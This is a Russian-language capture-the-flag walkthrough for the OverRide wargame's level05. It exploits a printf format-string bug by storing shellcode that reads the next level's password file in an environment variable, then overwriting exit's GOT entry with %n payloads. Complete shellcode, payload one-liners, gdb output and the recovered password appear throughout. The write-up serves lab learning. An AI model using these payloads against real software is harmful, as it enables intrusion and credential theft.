- Программа ожидает ввода от пользователя, при этом происходит замена строчных букв заглавными, все остальное выводится без изменений:
level05@OverRide:~$ ./level05
123aaaAAAA
123aaaaaaa

- Дизассемблируя код видим функцию printf, уязвимость который и будем использовать:

export SC=`python -c 'print("\x90" * 100000 + "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level06/.pass" )'`

- Вычислим порядковый номер аргумента
level05@OverRide:~$ ./level05
AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p
aaaa0x640xf7fcfac0(nil)(nil)(nil)(nil)0xffffffff0xfffe50740xf7fdb0000x616161610x702570250x702570250x702570250x70257025
 
- После printf идет функция exit, адрес которой мы подменим на адрес шеллкода

0x08048513 <+207>:   call   0x8048370 <exit@plt>

(gdb) disas 0x8048370
Dump of assembler code for function exit@plt:
   0x08048370 <+0>:     jmp    *0x80497e0
   0x08048376 <+6>:     push   $0x18

Адрес, который будем подменять 0x80497e0

Адрес, на который будем перезаписывать, найдем запустив программу через отладчик:

0xfffe582c:      "SC=\220\220\220\220\..."

Вариант 1:
python -c "print '\x08\x04\x97\xe0'[::-1] + '\x08\x04\x97\xe1'[::-1] + '\x08\x04\x97\xe2'[::-1] +  '\x08\x04\x97\xe3'[::-1]+'%0209x%10\$n' + '%0231x%11\$n' + '%055x%12\$n' + '%13\$n'" | ./level05

Вариант 2:
Для адреса 0xfffe992c:
Отступили от адреса 0xfffe582c заменив только 1 байт, чтобы осуществить переход на адрес 0xfffe992c.
2c (44)     44 - 16 = 28 байт
99 (153)    153 - 44 = 109 байт
fe (254)    254 - 153 = 101 байт
ff (255)    255 - 254 = 1 байт

python -c "print '\x08\x04\x97\xe0'[::-1] + '\x08\x04\x97\xe1'[::-1] + '\x08\x04\x97\xe2'[::-1] +  '\x08\x04\x97\xe3'[::-1]+'%28x%10\$n' + '%109x%11\$n' + '%101x%12\$n' + '%1x%13\$n' " | ./level05

h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
